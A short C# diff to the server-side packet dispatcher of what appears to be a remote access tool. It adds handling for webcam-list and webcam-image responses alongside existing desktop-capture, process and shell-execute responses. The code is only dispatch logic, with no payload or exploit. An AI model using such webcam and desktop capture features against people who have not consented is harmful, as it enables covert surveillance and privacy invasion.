@@ -34,6 +34,10 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetDesktopResponse(client, (ClientPackets.GetDesktopResponse)packet);
             }
+            else if (type == typeof(ClientPackets.GetWebcamImageResponse))
+            {
+                CommandHandler.HandleGetWebcamImageResponse(client, (ClientPackets.GetWebcamImageResponse)packet);
+            }
             else if (type == typeof(ClientPackets.GetProcessesResponse))
             {
                 CommandHandler.HandleGetProcessesResponse(client,
@@ -60,6 +64,10 @@ namespace xServer.Core.Packets
             else if (type == typeof(ClientPackets.GetMonitorsResponse))
             {
                 CommandHandler.HandleGetMonitorsResponse(client, (ClientPackets.GetMonitorsResponse)packet);
+            }
+            else if (type == typeof(ClientPackets.GetWebcamsResponse))
+            {
+                CommandHandler.HandleGetWebcamsResponse(client, (ClientPackets.GetWebcamsResponse)packet);
             }
             else if (type == typeof(ClientPackets.DoShellExecuteResponse))
             {
